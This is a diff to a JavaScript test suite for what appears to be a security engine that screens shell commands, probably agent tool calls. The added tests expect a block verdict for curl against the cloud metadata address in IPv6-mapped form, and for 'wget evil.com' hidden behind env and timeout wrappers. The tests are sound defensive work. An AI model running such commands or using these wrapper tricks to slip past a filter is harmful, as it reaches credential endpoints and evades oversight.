@@ -252,6 +252,9 @@ describe('ToolGuard Security Engine', () => {
 
       const bracketedIpv6Result = engine.evaluate('curl [fd00:ec2::254]');
       assert.strictEqual(bracketedIpv6Result.verdict, 'BLOCK');
+
+      const dottedBracketedResult = engine.evaluate('curl [::ffff:169.254.169.254]');
+      assert.strictEqual(dottedBracketedResult.verdict, 'BLOCK');
     });
 
     it('should unwrap env prefixes and evaluate network targets', () => {
@@ -262,6 +265,12 @@ describe('ToolGuard Security Engine', () => {
       });
       const envResult = netEngine.evaluate('FOO=1 wget evil.com');
       assert.strictEqual(envResult.verdict, 'BLOCK');
+
+      const wrapperEnvResult = netEngine.evaluate('env FOO=1 wget evil.com');
+      assert.strictEqual(wrapperEnvResult.verdict, 'BLOCK');
+
+      const timeoutResult = netEngine.evaluate('timeout -s TERM 10 wget evil.com');
+      assert.strictEqual(timeoutResult.verdict, 'BLOCK');
 
       const quotedDomainResult = netEngine.evaluate("wget 'evil.com'");
       assert.strictEqual(quotedDomainResult.verdict, 'BLOCK');
